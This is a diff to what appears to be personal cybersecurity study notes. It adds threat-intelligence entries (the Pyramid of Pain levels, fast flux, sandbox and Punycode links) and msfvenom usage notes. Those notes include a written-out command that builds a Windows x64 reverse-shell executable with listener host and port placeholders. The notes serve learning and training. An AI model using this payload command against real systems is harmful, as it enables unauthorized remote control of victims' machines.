@@ -65,12 +65,23 @@
   * [brim](https://www.brimdata.io/)
 * [Pyramid of Pain
   ](https://www.attackiq.com/glossary/pyramid-of-pain/)Demonstrates that some indicators of a compromise are more troubling to adversaries than others.
+  * TTP
+  * Tools
+  * Network Artifacts
+  * Host Artifacts
+  * Domain Names
+  * IP Address
+  * Hash Values
 * Blogs
   * [https://thedfirreport.com/](https://thedfirreport.com/)
   * [https://www.trellix.com/en-us/about/newsroom/stories/research.html](https://www.trellix.com/en-us/about/newsroom/stories/research.html)
 * Hash Lookups
   * [virustotal](https://www.virustotal.com/gui/home/upload)
   * [metadefender-opswat](https://metadefender.opswat.com/)
+* [Fast Flux
+  ](https://en.wikipedia.org/wiki/Fast_flux)Compromised hosts acting as proxies. Attacker has control over DNS server. IP address for the same domain keep changing (using IP addressses of the compromised hosts).
+* [app.any.run](https://app.any.run/)
+* [Punnycode](https://en.wikipedia.org/wiki/Punycode)
 * 
 
 #### Web Hacking
@@ -272,6 +283,17 @@
     * mysql_hashdump
   * multi/handler
   * msfvenom
+    * `msfvenom -p PAYLOAD OPTIONS`
+    * Payload Name
+      `OS/arch/payload`
+      `linux/x86/shell_reverse_tcp`
+    * Windows x64 Reverse Shell in an exe format
+      `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=listen-IP LPORT=listen-port`
+    * Payloads
+      * Staged Payloads (`/`)
+      * Stageless Payloads (`_`)
+    * `msfvenom --list payloads`
+    * `msfvenom --list payloads | grep "some_payload"`
   * portscan
   * SMB
     * smb_enumshares
